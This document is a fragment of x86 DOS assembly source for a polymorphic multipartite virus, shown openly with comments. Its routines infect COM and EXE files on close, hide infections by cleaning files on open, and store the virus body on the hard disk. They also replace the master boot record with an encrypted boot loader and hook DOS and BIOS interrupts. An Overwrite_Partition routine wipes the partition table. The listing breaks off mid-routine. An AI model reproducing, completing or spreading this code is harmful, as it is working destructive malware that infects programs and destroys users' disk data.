Boot_JMPs       DB      75h, 78h, 7Ch, 7Eh

Load_Segment    DW      1F16h   ; PUSH SS / POP DS.
                DW      1F50h   ; PUSH AX / POP DS.
                DW      0D88Eh  ; MOV DS, AX.
                DW      0716h   ; PUSH SS / POP ES.

                DB       50H, 07H, 8EH, 0C0h

DATA_119        DB      0C0h, 0C9H, 0D2H, 0DBh
Int24h          DW      4CBh, 512h
Int1Bh          DW      6EEh, 70h



; Dummy critical-error handler.
NewInt24h:
		MOV     AL, 03h
NewInt1Bh:      IRET


Clean_File:
                PUSH    AX                      ; Save registers.
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

		CALL    Set_Dummy_Handlers
		CALL    Save_FileAttr

		MOV     AX, 3D02h               ; Open file r/w.
		CALL    Traced_i21h
		JC      LOC_155

		PUSH    AX
		CALL    Check_FileName
		ADD     BX, 04h
		MOV     CX, BX
		POP     BX

                CMP     CX, 14
		JE      LOC_154

		PUSH    CS
		POP     DS

		CLD
		MOV     DI, OFFSET FileName1
		MOV     SI, OFFSET FileName2
		REPE    CMPSB                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
		JCXZ    LOC_151                 ; Jump if cx=0

		JMP     LOC_154

LOC_151:
		MOV     CX, 28                  ; Read header.
		MOV     DX, OFFSET Buffer
		MOV     AH, 3Fh
		CALL    Traced_i21h
		JC      LOC_154

		CALL    Save_FileTime
		MOV     AX, Trace_Int
		AND     AL, 00011111b           ; Clear all but seconds.

                CMP     AL, (34 / 2)            ; Infected stamp?
		JNE     LOC_153

                MOV     AX, Buffer.Marker

		CMP     AX, 'ZM'                ; True .EXE?
                JE      Do_Clean_EXE

                CMP     AX, 'MZ'                ; True .EXE-file?
		JNE     LOC_153

Do_Clean_EXE:   CALL    SUB_41
		JC      LOC_154

LOC_153:        CALL    Restore_FileTime

LOC_154:        MOV     AH, 3Eh                 ; Close file.
                CALL    Traced_i21h
LOC_155:        CALL    Restore_FileAttr
		CALL    Restore_Dummy_Handlers

		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		RETN

SUB_41:
                MOV     AX, Buffer.Init_CS      ; Size CS in bytes.
		MOV     DX, 16
		MUL     DX

                ADD     AX, Buffer.Init_IP      ; Plus IP.
		ADC     DX, 0

                MOV     CX, Buffer.Header_Size  ; Calculate headersize.
		SHL     CX, 04h                 ; MUL 16.

		ADD     AX, CX                  ; Plus headersize.
		ADC     DX, 0

		MOV     CX, DX                  ; Go to entrypoint of host.
		MOV     DX, AX
		MOV     AX, 4200h
		CALL    Traced_i21h
		JNC     No_Err_2

		RETN


No_Err_2:
		SUB     AX, Virus_Size
		SBB     DX, 0

		PUSH    AX
		PUSH    DX

                MOV     AH, 3Fh                 ; Read after header.
		MOV     CX, 128
                MOV     DX, OFFSET Buffer + 30
		CALL    Traced_i21h
		JNC     LOC_157

		CMP     AX, 36
		JA      LOC_157

		ADD     SP, 04h
		STC
		RETN

LOC_157:
		PUSH    BX

		MOV     DI, AX
		ADD     DI, DX
		MOV     CX, 50
		STD

		MOV     AL, '.'
		REPNE   SCASB

		OR      CX, CX
		JNZ     LOC_158

		POP     BX

		ADD     SP, 04h
		STC

		RETN
LOC_158:
		MOV     AH, [DI+2]
		XOR     BX, BX

LOC_159:        CMP     Encr_Methods[BX], AH
		JE      LOC_161

		INC     BX

		CMP     BX, 04h
		JA      LOC_160

		JMP     LOC_159
LOC_160:
		POP     BX

		ADD     SP, 04h
		STC

		RETN

LOC_161:
		MOV     AL,[DI+3]
		XOR     BX, BX

LOC_162:        CMP     AL, DATA_111[BX]
		JE      LOC_164

		INC     BX

		CMP     BX, 19h
		JA      LOC_163

		JMP     LOC_162
LOC_163:
		POP     BX
		ADD     SP, 04h
		STC

		RETN
LOC_164:
		AND     BL, 07h
                MOV     AL, MOV_Reg8[BX]
		MOV     CX, 50
		REPNE   SCASB                   ; Rep zf=0+cx >0 Scan es:[di] for al

		OR      CX, CX
		JNZ     LOC_165

		POP     BX
		ADD     SP, 04h
		STC
		RETN
LOC_165:
		MOV     AL, [DI+2]
		CLD
		POP     BX
		POP     CX
		POP     DX
		PUSH    DX

		PUSH    CX
		PUSH    AX

		MOV     AX, 4200h
		ADD     DX, OFFSET Old_Entry
		ADC     CX, 0
		CALL    Traced_i21h

		MOV     CX, 15
                MOV     DX, OFFSET Buffer + 30
		MOV     AH, 3Fh                 ; Read 
		CALL    Traced_i21h

		POP     AX
                MOV     byte ptr Crp_1, AH
		JMP     $+2               ; delay for I/O
		MOV     DI, DX
		MOV     CX, 15

LOCLOOP_166:
Crp_1:
		ADD     [DI],AL
		NOT     BYTE PTR [DI]

		INC     DI
		LOOP    LOCLOOP_166

		MOV     DI,DX

		MOV     AX,[DI]
                MOV     Buffer.Init_IP, AX

		MOV     AX, [DI+2]
                MOV     Buffer.Init_CS, AX

		MOV     AX, [DI+4]
                MOV     Buffer.Init_SP, AX

		MOV     AX, [DI+6]
                MOV     Buffer.Init_SS, AX

		MOV     AX, [DI+8]
                MOV     Buffer.File_Mod512, AX

		MOV     AX, [DI+0AH]
                MOV     Buffer.Byte_Pages, AX

		MOV     AX, [DI+0CH]
		MOV     Trace_Int, AX

		MOV     AL, [DI+0EH]

		CMP     AL, 01h
		JE      LOC_167

		ADD     SP,4
		STC
		RETN
LOC_167:
		POP     CX
		POP     DX

		PUSH    DX
		PUSH    CX

		AND     DX, 1FFh

                CMP     Buffer.File_Mod512, DX
		JE      LOC_168

		ADD     SP, 04h
		STC
		RETN

LOC_168:
		XOR     CX, CX                  ; Go to start of file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

		MOV     DX, OFFSET Buffer       ; Read header.
		MOV     CX, 28
		MOV     AH, 40h
		CALL    Traced_i21h

		POP     CX                      ; Go to start of file.
		POP     DX
		MOV     AX, 4200h
		CALL    Traced_i21h

		MOV     AH, 40h                 ; Write <EOF> marker.
		XOR     CX, CX
		CALL    Traced_i21h

		RETN



Set_Dummy_Handlers:

		PUSH    ES

		XOR     AX, AX
		MOV     ES, AX

		MOV     AX, ES:[24h * 4]        ; Save INT 24h.
                MOV     CS:Int24h, AX           ; (Critical error-handler).
		MOV     AX, ES:[24h * 4 + 2]
		MOV     CS:Int24h+2, AX

		MOV     AX, ES:[1Bh * 4]        ; Save INT 1Bh.
                MOV     CS:Int1Bh, AX           ; (Ctrl-Break handler).
		MOV     AX, ES:[1Bh * 4 + 2]
                MOV     CS:Int1Bh+2, AX

		MOV     ES:[24h * 4 + 2], CS    ; Dummy error-handler.
		MOV     ES:[24h * 4], OFFSET NewInt24h

		MOV     ES:[1Bh * 4 + 2], CS    ; Dummy Ctrl-Break handler.
                MOV     ES:[1Bh * 4], OFFSET NewInt1Bh

		POP     ES

		RETN


Restore_Dummy_Handlers:

		PUSH    DS
		PUSH    ES
		PUSH    SI

		XOR     AX, AX
		CLD

		PUSH    CS
		POP     DS

		MOV     ES, AX

		MOV     SI, OFFSET Int24h       ; Restore original INT 24h.
		MOV     DI, 24h * 4
		MOVSW
		MOVSW

		MOV     DI, 1Bh * 4             ; Restore original INT 1Bh.
		MOVSW
		MOVSW

		POP     SI
		POP     ES
		POP     DS

		RETN


Make_Random_Stack:

                CALL    Get_Random_Poly

                AND     AX, 00000011b           ; Mask between 0 - 3.
                JZ      Make_Random_Stack

                ADD     AX, Buffer.Init_CS      ; Variable stacksegment.
                MOV     Buffer.Init_SS, AX

                CALL    Get_Random_Poly
                AND     AX, 00000111b           ; 0 - 7.
		ADD     AX, (Virus_Size + 272)

		AND     AL, 11111110b
                MOV     Buffer.Init_SP, AX

		RETN


Infect_Close:
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI
		PUSHF

		PUSH    AX
		CALL    Set_Dummy_Handlers

		TEST    CS:Flags, 00000001b
		JNZ     LOC_172

		CALL    Save_FileTime
		MOV     AX, CS:Trace_Int
		AND     AL, 00011111b           ; Mask seconds.

		CMP     AL, 00010001b           ; Infected stamp?
		JE      LOC_172

		CALL    Get_FileName
		JC      LOC_172

		XOR     CX, CX                  ; Go to begin file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h
		JC      LOC_172

		MOV     AH, 3Fh                 ; Read header.
		MOV     CX, 28

		PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

		MOV     DX, OFFSET Buffer
		CALL    Traced_i21h
		JC      LOC_172

		CMP     AX, CX                  ; Bytes read not equal?
		JNE     LOC_172

		MOV     SI, DX
		CLD
		LODSW                           ; String [si] to ax

		CMP     AX, 'ZM'                ; True .EXE-file?
		JE      LOC_170

		CMP     AX, 'MZ'                ; True .EXE-file?
		JE      LOC_170

		CALL    Infect_COM
		JC      LOC_172

		JMP     LOC_171
LOC_170:
		CALL    Infect_EXE
		JC      LOC_172

LOC_171:        MOV     AX, Trace_Int
                AND     AL, 11100000b           ; Clear seconds.
                OR      AL, (34 / 2)            ; Set 34 seconds.
		MOV     Trace_Int, AX
		CALL    Restore_FileTime

LOC_172:        POP     AX
		POPF
		MOV     AH, 3Eh                 ; Close file.
		CALL    Traced_i21h

		PUSH    AX
		PUSHF
		CALL    Restore_Dummy_Handlers

		POPF
		POP     AX
		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX

		RETN



Get_FileName:
		PUSH    BX

		MOV     AX, 1220h               ; Get DCB-number.
		INT     2Fh
		JNC     LOC_174

Error_DCB:      STC
		JMP     LOC_183
		NOP
LOC_174:
		CMP     BYTE PTR ES:[DI], 0FFh  ; Filehandle not open?
		JE      Error_DCB

		XOR     BX, BX
		MOV     BL, ES:[DI]

		MOV     AX, 1216h               ; Get DCB-address.
		INT     2Fh
		JC      LOC_183

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES

;*              AND     [DI+2],0FFF8H
		DB       83H, 65H, 02H,0F8H     ;  Fixup - byte match
		OR      WORD PTR [DI+2], 02h    ; Set file open-mode to r/w.
		ADD     DI, 20h
		MOV     SI, DI
		CLD
		PUSH    SI
		MOV     DI, OFFSET FileName2
		XOR     BX, BX
		MOV     CX, 08h

LOCLOOP_175:    LODSB                           ; String [si] to al

		CMP     AL, ' '
		JE      LOC_176

		STOSB
		INC     BX
		LOOP    LOCLOOP_175

LOC_176:        MOV     AL, '.'
		STOSB

		INC     BX
		POP     SI
		ADD     SI, 08h
		MOV     CX, 03h

LOCLOOP_177:    LODSB                           ; String [si] to al
		CMP     AL, ' '
		JE      LOC_178

		STOSB
		INC     BX
		INC     BH
		LOOP    LOCLOOP_177

LOC_178:        CMP     BH, 03h
		JE      LOC_180

LOC_179:        STC
		JMP     LOC_183
LOC_180:
		SUB     SI,3
		LODSW                           ; String [si] to ax

		CMP     AX, 'XE'                ; .EXE-file?
		JE      LOC_181

		CMP     AX, 'OC'                ; .COM-file?
		JNE     LOC_179

LOC_181:        LODSB                           ; String [si] to al

		CMP     AX, 'XE'                ; .EXE-file?
		JE      LOC_182

		CMP     AX, 'OM'                ; .COM-file?
		JNE     LOC_179

LOC_182:        MOV     BH, 00h
		CALL    SUB_14

LOC_183:        POP     BX

		RETN

Check_Infect:
		TEST    Flags, 00000100b
                JZ      No_JMP_Start

                CMP     Host_Type, 00h          ; Host is .COM-file?
                JE      Handle_COM1

                MOV     AX, [SI+0Eh]            ; SS.
                SUB     AX, [SI+16h]            ; Minus CS.
                JZ      No_JMP_Start

		SUB     AX, 03h
                JA      No_JMP_Start

                MOV     AX, [SI+14h]            ; AX = IP.

		CMP     AX, OFFSET Buffer
                JB      No_JMP_Start

		CMP     AX, 1EC4h
                JA      No_JMP_Start

		STC

		RETN
Handle_COM1:
                CMP     BYTE PTR [SI], 0E9h     ; Starts with a JMP ?
                JNE     No_JMP_Start

		STC

		RETN
No_JMP_Start:
		CLC

		RETN



Infect_Harddisk:

                MOV     AX, Res_Check_i13h      ; Residency-check.
		INT     13h

                CMP     AX, Marker_Mem_i13h     ; Are we already resident?
		JE      JMP_Exit_HD_Infect      ; (harddisk already infected)

		PUSH    CS
		POP     ES

		XOR     AX, AX
		MOV     DS, AX

		MOV     SI, 13h * 4             ; Save INT 13h.
		MOV     DI, OFFSET Traced_Int13h

		CLD
		MOVSW
		MOVSW

		PUSH    CS
		POP     DS

		MOV     DX, 80h                 ; Read MBR of 1st harddisk.
		MOV     CX, 01h
		MOV     AX, 0201h
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h
		JNC     No_Err_1

JMP_Exit_HD_Infect:

		JMP     LOC_RET_189
		NOP
No_Err_1:
                MOV     AX, WORD PTR DS:[Buffer+102h]
                SUB     AX, WORD PTR DS:[Buffer+100h]

                CMP     AX, Marker_Boot         ; Already infected?
		JE      JMP_Exit_HD_Infect

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		CALL    Traced_i13h

                MOV     AX, 0300h+Body_Sectors  ; Store virusbody on HD.
		XOR     BX, BX
		INC     CH
                MOV     Hiding_TS, CX
		DEC     DH
		SUB     CL, 16                  ; - Virus_Size
		MOV     DL, 80h
		CALL    Traced_i13h
		JC      JMP_Exit_HD_Infect

		ADD     CL, 16                  ; Store original MBR.
		MOV     BX, OFFSET Buffer
		MOV     AX, 0301h
		CALL    Encrypt_Boot
		CALL    Traced_i13h
		JC      JMP_Exit_HD_Infect

		CLD
		MOV     BL, 01h
		CALL    SUB_49
		MOV     DX, 80h
		MOV     CX, 01h
		MOV     AX, 0301h
		MOV     BX, OFFSET Buffer

		TEST    Flags, 10000000b      ; Win95/NT active?
		JZ      LOC_188

		PUSH    AX                      ; PARAMETER_4
		PUSH    BX                      ; PARAMETER_3
		PUSH    CX                      ; PARAMETER_2
		PUSH    DX                      ; PARAMETER_1
		CALL    Infect_Exec2
		JNC     LOC_RET_189             ; Jump if carry=0

LOC_188:        CALL    Write_Boot

LOC_RET_189:
		RETN


                ; *** POLYMORPHIC ENCRYPTED BOOT LOADER ***


		CLI
		XOR     AX, AX
		MOV     SS, AX                  ; Setup stack.
		MOV     SP, 7C00h
		MOV     DS, AX
Init_Boot_Key:  MOV     CH, 0B8h
Boot_Key        =       BYTE PTR $-1
Boot_Ptr:       MOV     SI, 7C16h
Start_Encr      =       WORD PTR $-2

Decr_Byte_Boot: SUB     [SI], CH
Change_Ptr:     INC     SI
Change_Key:     INC     CH
Boot_Loop:      JL      Decr_Byte_Boot          ; Jump if <


                STI                             ; Restore possible changed
                                                ; flag.

                INT     12h                     ; Get total DOS-memory.
		SUB     AX, 9                   ; Reserve our memory.

		MOV     CL, 6                   ; Convert to segment-address.
		SHL     AX, CL

                MOV     ES, AX                  ; ES = our new segment.

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		INT     13h

		INC     CH
                DEC     DH
                SUB     CL, Body_Sectors
		MOV     DL, 80h
                MOV     AX, 0201h+Body_Sectors  ; Read virusbody from disk.
		XOR     BX, BX
		INT     13h

                PUSH    ES                      ; JMP to relocated virus.
		MOV     AX, OFFSET Reloc_Boot
		PUSH    AX
		RETF

Traced_Int13h   DW      0, 0

Reloc_Boot:
		PUSH    DS                      ; ES = 0.
		POP     ES

		PUSH    CS
		POP     DS

		MOV     DI, 7C00h

                PUSH    ES                      ; Address boot-area.
		PUSH    DI

                MOV     SI, (Body_Sectors*512)  ; Offset original bootsector.

                CLD                             ; Copy original bootsector to
                MOV     CX, 512                 ; Boot-area.
                REP     MOVSB                   ; *** MOVSW would be faster.

                CALL    Init_Virus
		STI
                RETF                            ; JMP to original bootsector.

SUB_49:
                MOV     DS:Poly_Sector, 00h
		PUSH    BX
		CLD
                CALL    Get_Boolean

                MOV     AH, MOV_Ptr[BX]
                MOV     BYTE PTR Boot_Ptr, AH
                MOV     AH, Inc_Ptr[BX]
                MOV     BYTE PTR Change_Ptr, AH
		MOV     DL, BL
		ADD     BL, 03h

		CMP     BL, 03h
		JNE     LOC_191

		SUB     BL,2

LOC_191:        MOV     DATA_94,BL

LOC_192:        CALL    Get_Random_Poly
		NOT     AX
                AND     AL, 07h                 ; 0 - 7.
		MOV     BL, AL
		SHR     AL, 01h

		CMP     DATA_94, AL
		JE      LOC_192

                MOV     Used_Reg8, BL
                MOV     AH, MOV_Reg8[BX]
                MOV     BYTE PTR Init_Boot_Key, AH
                MOV     AH, ADD_Reg8[BX]
                MOV     BYTE PTR Change_Key+1, AH
		SHL     DL, 03h
		ADD     BL, DL
		MOV     AH, DATA_111[BX]
                MOV     byte ptr Decr_Byte_Boot+1, AH
                CALL    Get_Random_Poly
		MOV     BL, AH
                AND     BX, 03h                 ; 0 - 3.

                MOV     AH, Boot_JMPs[BX]
                MOV     BYTE PTR Boot_Loop, AH
                CALL    Get_Boolean
                MOV     AL, Encr_Methods[BX]
		MOV     AH, 0E0h
                MOV     WORD PTR Bozo, AX
		XOR     BL, 03h
                MOV     AL, Encr_Methods[BX]
                MOV     byte ptr Decr_Byte_Boot, AL

LOC_193:        CALL    Get_Random_Poly
		OR      AH, 10000000b

		CMP     AH, 0D8h
		JAE     LOC_193

		POP     BX
		PUSH    BX
		PUSH    AX
		MOV     BH, 00h
                MOV     Boot_Key, AH
		MOV     SI, 1409h
		MOV     DI, OFFSET Buffer
                MOV     Start_Encr, 7C16h

		CMP     BL, 02h
		JNE     LOC_194

                MOV     DI, OFFSET Buffer + 62
                MOV     Start_Encr, 7C54h

LOC_194:        CALL    Get_Random_Poly
		AND     AX, 03h
		XCHG    BX, AX
		MOV     AL, DATA_119[BX]
		MOV     [SI+2], AL
		MOV     AL, 0D0h
		ADD     AL, BL
		MOV     [SI+4], AL

		MOVSW
		MOVSW
		MOVSW
		MOVSW

		MOV     DH, BL
		XOR     CX, CX
		CALL    SUB_50
                CALL    Get_Random_Poly
		OR      AX, AX
		JP      LOC_195                 ; Jump if parity=1
		MOV     AX,[SI]
		ADD     SI, 02h
		OR      Flags, 00001000b
		MOVSW
		MOVSB
		STOSW
		JMP     LOC_196
LOC_195:
		MOVSW
		MOVSW
		MOVSB

LOC_196:        CALL    SUB_51
		MOVSW                           ; Mov [si] to es:[di]
		MOV     DATA_93, 0FFh
		CALL    SUB_27
                CALL    Gen_Increase_Reg
		LODSW                           ; String [si] to ax
		SUB     AH, CL
		STOSW
		SUB     CL, CH
		MOV     AL, CH

		TEST    Flags, 00001000b
		JZ      LOC_197

		ADD     AL, 02h
LOC_197:        AND     Flags, 0F7h
		CBW                             ; Convrt byte to word
		MOV     SI, 1E77h
		SUB     SI, AX
		MOV     AX, CX
		POP     CX
		POP     BX
		PUSH    CX

		CMP     BL, 02h
		JNE     LOC_198

		ADD     SI, 3Eh

LOC_198:        CBW                             ; Convrt byte to word
                ADD     [SI], AX
		POP     AX
                MOV     CX, 1Fh
                MOV     SI, 1DEFh

		CMP     BL, 02h
		JE      LOCLOOP_199

		CMP     BL, 01h
		JNE     LOC_RET_200

		MOV     CX, 28h
		MOV     SI, 141Fh

LOCLOOP_199:
		LODSB                           ; String [si] to al

Bozo:
;*              ADD     AL,AH
		DB       00H,0E0H               ;  Fixup - byte match
		INC     AH
		STOSB                           ; Store al to es:[di]
		LOOP    LOCLOOP_199

                CALL    Get_Random_Poly
		NOT     AX

                MOV     Buffer + 100h, AX       ; Construct variable ID.
                ADD     AX, Marker_Boot
                MOV     Buffer + 102h, AX

LOC_RET_200:
		RETN


SUB_50:
                ADD     SI, 02h                 ; *** Better use 2x INC SI.
                CALL    Get_Random_Poly
		NOT     AX
		AND     AL, 03h
		MOV     BL, AL
                MOV     DL, Overrides[BX]

		CMP     AL, 01h
		JE      LOC_203

		CMP     AL, 03h
		JE      LOC_203

		SHR     BL, 01h
		MOV     AL, 06h
		MUL     BL                      ; ax = reg * al
		MOV     BX, AX
LOC_201:
                CALL    Get_Random_Poly
                AND     AH, 03h                 ; 0 - 3.

                CMP     AH, 03h                 ; 0, 1, 2
		JE      LOC_201

                SHL     AH, 1                   ; MUL 2.
                ADD     BL, AH
                MOV     AX, Load_Segment[BX]

                CMP     AL, 16h                 ; PUSH SS ?
		JE      LOC_203

                CMP     AL, 50h                 ; PUSH AX ?
		JNE     LOC_202

		ADD     AL, DH
		STOSW

		RETN

LOC_202:
		ADD     AH, DH
		STOSW

		RETN
LOC_203:
		MOV     CH, 02h

		RETN



SUB_51:
		CMP     DL, 3Eh
		JE      LOC_RET_204

		MOV     AL, DL
		STOSB

		ADD     CL, 01h

LOC_RET_204:
		RETN


Gen_Increase_Reg:

                CALL    Get_Random_Poly
                NOT     AX                      ; Randomize AL.
                ADD     AL, AH

		CMP     AL, 85
		JB      LOC_206

                ADD     SI, 2
                ADD     CL, 1
                MOV     BL, Used_Reg8

                CMP     AL, 170
                JB      Gen_Increase_Reg8

                MOV     AL, 80h                 ; Make ADD Reg8, 1
                MOV     AH, ADD_Reg8[BX]
		STOSW

                MOV     AL, 01h                 ; ADD one.
		STOSB

		RETN

; BX = Register.
Gen_Increase_Reg8:

                MOV     AL, 80h                 ; Arithmic opcode.
                MOV     AH, SUB_Reg8[BX]        ; Operand (register).
		STOSW

                MOV     AL, 0FFh                ; Positive SUB.
		STOSB

		RETN

LOC_206:
                MOVSW

		RETN



Encrypt_Boot:
		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    DI
		PUSH    SI

		CLD
		MOV     DX, BX
		MOV     DI, DX
		MOV     AX, 'ef'
                MOV     BX, 7463h
                MOV     CX, (1024 / 2)

LOCLOOP_207:    SCASW                           ; Scan es:[di] for ax
		JNZ     LOC_208

		XCHG    BX, AX

		SCASW                           ; Scan es:[di] for ax
		JZ      LOC_209

		XCHG    BX, AX
		SUB     DI, 02h
LOC_208:        DEC     DI
		LOOP    LOCLOOP_207

		JMP     LOC_215
LOC_209:        MOV     AX, 4Eh
LOC_210:        MOV     CX, 200h
		MOV     DI, DX
		MOV     SI, 0Ch

LOCLOOP_211:    SCASW                           ; Scan es:[di] for ax
		JNZ     LOC_212

		ADD     ES:[DI-2], SI
LOC_212:        DEC     DI
		LOOP    LOCLOOP_211

		DEC     AX
		DEC     AX

		CMP     AX, 4Ch
		JE      LOC_210

		MOV     DI, DX
		MOV     CX, 1C0h
		MOV     AX, 280h

LOCLOOP_213:    SCASW                           ; Scan es:[di] for ax
		JC      LOC_214

		DEC     DI
		DEC     DI
		PUSH    AX
		DEC     AX
		DEC     AX
		SCASW                           ; Scan es:[di] for ax
		POP     AX
		JA      LOC_214

		SUB     ES:[DI-2],SI

LOC_214:        DEC     DI
		LOOP    LOCLOOP_213

LOC_215:        POP     SI
		POP     DI
		POP     DX
		POP     CX
		POP     BX
		POP     AX
		POPF

		RETN



Infect_HD:
		MOV     AX, 0201h               ; Read MBR of 1st harddisk.
		MOV     BX, OFFSET Buffer
                XOR     CX, CX                  ; DS=0.
		MOV     DS, CX
                PUSH    CS                      ; ES=CS.
		POP     ES
                INC     CX                      ; Sector 1, (MBR).
		MOV     DX, 80h
		INT     13h

                ; Copy partition-table.

                MOV     DI, OFFSET Buffer + 1BEh
                MOV     SI, 7C00h + 1BEh
                MOV     CL, 64                  ; CX = 64.
		REP     MOVSB

                INC     CX                      ; CX = 01h.

		PUSH    CS
		POP     DS

		MOV     AX, 0301h
                MOV     Ermm, CH
                CALL    Write_Boot

		RETN

Ermm            DB      0

Overwrite_Partition:

		PUSH    AX
		PUSH    BX
		PUSH    DX

		MOV     AX, 0201h               ; Read MBR of 1st harddisk.
		MOV     BX, OFFSET Buffer
		PUSH    CS
		POP     ES
		MOV     CX, 01h
		MOV     DX, 80h
		CALL    Traced_i13h

                MOV     DI, OFFSET Buffer+1BEh  ; Overwrite partition-table.
                MOV     CL, 64
		REP     STOSB

		INC     CX
		MOV     AX, 0301h
                CALL    Write_Boot

		POP     DX
		POP     BX
		POP     AX

		RETN

Init_Virus:
                CALL    Infect_HD
                CALL    Check_Trigger

		XOR     AX, AX
		MOV     DS, AX

                MOV     SI, 1Ch * 4             ; Save address INT 1Ch.
		MOV     DI, OFFSET Int1Ch
		MOVSW
		MOVSW

                MOV     SI, 21h * 4             ; Save address INT 21h.
		MOV     DI, OFFSET Int13h
		MOVSW
		MOVSW

		INT     12h                     ; Save total DOS-memory.
		MOV     CS:Dos_Mem, AX          ; Save it.

		SUB     WORD PTR DS:[413h], 9   ; Subtract our needs.
                NOP                             ; *** !!!

                ; Hook INT 13h after two hooks.

                MOV     BYTE PTR CS:DATA_77, 2

		CLI                             ; Hook INT 1Ch (timer).
		MOV     DS:[1Ch * 4 + 2], CS
		MOV     DS:[1Ch * 4], OFFSET NewInt1Ch
		STI

		CALL    Check_Poly_Sector

		RETN

NewInt1Ch:
		PUSH    AX
		PUSH    DS
		PUSH    ES
		PUSH    SI
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		MOV     SI, 21h * 4

		PUSH    CS
		POP     ES

		MOV     DI, OFFSET Int13h
		CLD

                CMPSW                           ; INT 21h offset changed?
                JZ      Check_i1Ch_Seg

                MOV     AL, 1                   ; No change.

Check_i1Ch_Seg: CMPSW                           ; INT 21h segment changed?
		JZ      LOC_217

                MOV     AH, 1

LOC_217:        OR      AX, AX                  ; INT 21h changed?
                JZ      Exit_Int1Ch

                SUB     SI, 4                   ; SI = 21h * 4
                SUB     DI, 4                   ; DI = OFFSET Int13h
                MOVSW                           ; Save address INT 21h.
		MOVSW

                DEC     BYTE PTR ES:DATA_77     ; 
                JNZ     Exit_Int1Ch

                MOV     DI, OFFSET Traced_Int13h
		MOV     SI, 13h * 4
                MOVSW                           ; Save address INT 13h.
		MOVSW

                MOV     DI, OFFSET Int13h       ; Save address INT 13h.
		MOV     SI, 13h * 4
		MOVSW
		MOVSW

		MOV     DI, OFFSET Traced_Int21h
		MOV     SI, 21h * 4
                MOVSW                           ; Save address INT 21h.
		MOVSW

                MOV     DS:[1Ch * 4], OFFSET Int1Ch_Install

Exit_Int1Ch:    POP     DI
		POP     SI
		POP     ES
		POP     DS
		POP     AX

JMP_Int1Ch:     JMP     DWORD PTR CS:Int1Ch


Int1Ch_Install:
		PUSH    AX
		PUSH    DS
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		MOV     DS, DS:[22h * 4 + 2]    ; Get 1st instruction of
                MOV     AX, DS:[0]              ; INT 22h (terminate addrez).

                CMP     AX, 20CDh               ; Is it INT 20h?
                JNE     Exit_i1Ch_Inst          ; (Thus DOS loaded).

		XOR     AX, AX
		MOV     DS, AX

                MOV     AX, CS:Dos_Mem          ; Restore total DOS-memory.
                MOV     DS:[413h], AX           ; *** Better use ADD.

		MOV     AX, CS:Int1Ch           ; Restore original INT 1Ch.
		MOV     DS:[1Ch * 4], AX
                MOV     AX, CS:Int1Ch+2
		MOV     DS:[1Ch * 4 + 2], AX

		MOV     AX, DS:[21h * 4]        ; Save INT 21h.
                MOV     CS:Int21h, AX
		MOV     AX, DS:[21h * 4 + 2]
                MOV     CS:Int21h+2, AX

		MOV     AX, DS:[28h * 4]        ; Save INT 28h.
		MOV     CS:Int28h, AX
		MOV     AX, DS:[28h * 4 + 2]
		MOV     CS:Int28h+2, AX

		MOV     DS:[28h * 4], OFFSET NewInt28h  ; Hook INT 28h.
		MOV     DS:[28h * 4 + 2], CS

		MOV     DS:[21h * 4], OFFSET NewInt21h  ; Hook INT 21h.
		MOV     DS:[21h * 4 + 2], CS

		PUSH    SI
		PUSH    ES

                CALL    Slice_Int13h            ; Save INT 13h entry-bytez.
                CALL    Insert_Slice            ; Hook INT 13h via a FAR JMP.

		POP     ES
		POP     SI

Exit_i1Ch_Inst: POP     DI
		POP     DS
		POP     AX

                JMP     JMP_Int1Ch

; DOS safe to use.
NewInt28h:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

                TEST    CS:Ermm, 10000000b
		JNZ     LOC_221

                OR      CS:Ermm, 10000000b
		CLD

		PUSH    CS
		POP     DS

		CALL    Unslice_Int13h
		CALL    Infect_Harddisk
                CALL    Overwrite_Partition
		CALL    Insert_Slice

LOC_221:        CALL    CheckWin4Hook
                CALL    Check_i13h_Hook

		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

                DB      0EAh                    ; JMP FAR opcode.
Int28h          DW      0, 0


CheckWin4Hook:
                MOV     AX, 160Ah               ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Valid function?
		JNZ     LOC_223

		CMP     BH, 04h                 ; Windows 95/NT ?
		JB      LOC_223                 ; Else abort function.

		OR      CS:Flags, 00000100b

                MOV     AX, Res_Check_i13h      ; INT 13h residency-check.
		INT     13h

                CMP     AX, Marker_Mem_i13h     ; Have we hooked INT 13h?
		JE      LOC_RET_222

                OR      CS:Ermm, 00000010b

		MOV     AX, 3513h               ; Get address INT 13h.
		INT     21h

                MOV     CS:Traced_Int13h, BX    ; Save address INT 13h.
		MOV     CS:Traced_Int13h+2, ES

		XOR     AX, AX
		MOV     DS, AX

		MOV     DS:[13h * 4], OFFSET NewInt13h
		MOV     DS:[13h * 4 + 2], CS

LOC_RET_222:
		RETN
LOC_223:
		AND     CS:Flags, 11111011b
                AND     CS:Ermm, 11111100b

		RETN



Check_i13h_Hook:
		TEST    CS:Flags, 00000100b
		JNZ     LOC_RET_224

                MOV     AX, Res_Check_i13h      ; INT 13h hooked already?
		INT     13h

                CMP     AX, Marker_Mem_i13h
		JE      LOC_RET_224

		MOV     AX, CS:Int13h
		MOV     CS:Traced_Int13h, AX
		MOV     AX, CS:Int13h+2
